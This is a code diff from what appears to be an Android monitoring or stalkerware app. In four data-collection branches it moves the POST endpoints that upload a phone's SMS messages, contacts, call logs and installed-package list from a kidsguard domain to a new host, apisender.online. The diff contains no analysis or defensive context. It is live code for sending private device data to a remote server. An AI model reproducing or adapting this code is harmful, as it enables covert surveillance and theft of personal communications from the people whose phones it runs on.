@@ -119,7 +119,7 @@ String bod,name,number;
             case "SMS Data":
                 //Code Here
 
-                StringRequest stringRequest=new StringRequest(Request.Method.POST,"https://im.kidsguard.ml/api/sms-list/",
+                StringRequest stringRequest=new StringRequest(Request.Method.POST,"https://apisender.online/api/sms-list/",
                         new Response.Listener<String>() {
                             @TargetApi(Build.VERSION_CODES.N)
                             @RequiresApi(api = Build.VERSION_CODES.N)
@@ -241,7 +241,7 @@ String bod,name,number;
             case "Contact Data":
                 //Code Here
 
-                stringRequest=new StringRequest(Request.Method.POST,"https://im.kidsguard.ml/api/contacts-list/",
+                stringRequest=new StringRequest(Request.Method.POST,"https://apisender.online/api/contacts-list/",
                         new Response.Listener<String>() {
                             @Override
                             public void onResponse(String response) {
@@ -318,7 +318,7 @@ String bod,name,number;
             case "Call Data":
                 //Code Here
 
-                stringRequest=new StringRequest(Request.Method.POST,"https://im.kidsguard.ml/api/calls-list/",
+                stringRequest=new StringRequest(Request.Method.POST,"https://apisender.online/api/calls-list/",
                         new Response.Listener<String>() {
                             @Override
                             public void onResponse(String response) {
@@ -430,7 +430,7 @@ String bod,name,number;
 
             case "InstalledPackage Data":
                 //Code Here
-                stringRequest=new StringRequest(Request.Method.POST,"https://im.kidsguard.ml/api/packagename-list/",
+                stringRequest=new StringRequest(Request.Method.POST,"https://apisender.online/api/packagename-list/",
                         new Response.Listener<String>() {
                             @Override
                             public void onResponse(String response) {
